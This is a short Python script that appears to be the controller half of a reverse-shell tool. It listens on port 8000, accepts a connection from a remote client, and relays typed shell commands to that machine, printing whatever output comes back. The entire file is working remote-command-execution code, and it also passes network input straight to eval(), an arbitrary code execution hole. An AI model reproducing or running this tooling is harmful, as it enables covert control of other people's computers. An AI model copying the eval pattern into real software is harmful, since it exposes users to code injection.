import socket
import os
from network import Network

ADDRESS = (socket.gethostbyname(socket.gethostname()), 8000)


def cd(old_dir: str, dir: str) -> str:
    if dir.startswith("./"):
        return os.path.join(old_dir, dir.removeprefix("./"))
    elif dir.startswith("../"):
        return old_dir
    else:
        return dir


server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(ADDRESS)
server.listen()
print(f"* Server started listening on {ADDRESS[0]}:{ADDRESS[1]}")

conn, addr = server.accept()
print(f"* Connection from {addr[0]}:{addr[1]}")

net = Network(conn)
cwd = net.recv()
while True:
    raw_command = input(cwd + ">")
    args = raw_command.split(" ")
    command = args.pop(0)

    if command == "cd":
        if len(args) > 0:
            new_cwd = cd(cwd, "".join(args))
            net.send("cd")
            net.send(new_cwd)
            exists = eval(net.recv())
            if exists:
                cwd = new_cwd
        else:
            print(cwd)

        continue

    net.send(raw_command)
    net.send(cwd)

    print(net.recv())
